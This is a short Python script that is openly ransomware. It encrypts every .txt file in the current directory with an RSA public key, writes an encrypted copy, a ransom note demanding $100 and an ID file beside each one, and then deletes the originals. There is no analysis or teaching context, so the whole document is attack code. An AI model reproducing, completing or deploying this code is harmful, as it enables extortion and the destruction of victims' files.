import os
import sys
from Crypto.Hash import SHA256
from Crypto.PublicKey import RSA
from Crypto.Signature import PKCS1_v1_5
from Crypto.Cipher import PKCS1_OAEP

if __name__ == "__main__":
    public_key = RSA.import_key(open("e.key").read())
    # Read each file in the current directory that ends with .txt and encrypt it
    count = 0
    for file in os.listdir():
        if file.endswith(".txt"):
            # Read the file
            file_in = open(file, "rb")
            message = file_in.read()
            file_in.close()
            # Encrypt the file
            encryptor = PKCS1_OAEP.new(public_key)
            encrypted = encryptor.encrypt(message)
            # Write the encrypted file
            file_out = open(file + ".encrypted", "wb")
            file_out.write(encrypted)
            file_out.close()
            # Write the note
            file_out = open(file + ".note", "w")
            file_out.write("This is a ransom note. Pay $100 to get your file back.")
            file_out.close()
            # Write a unique identifier number to the file
            file_out = open(file + ".ID", "w")
            file_out.write(str(count))
            file_out.close()
            # Delete the original file
            os.remove(file)
            count += 1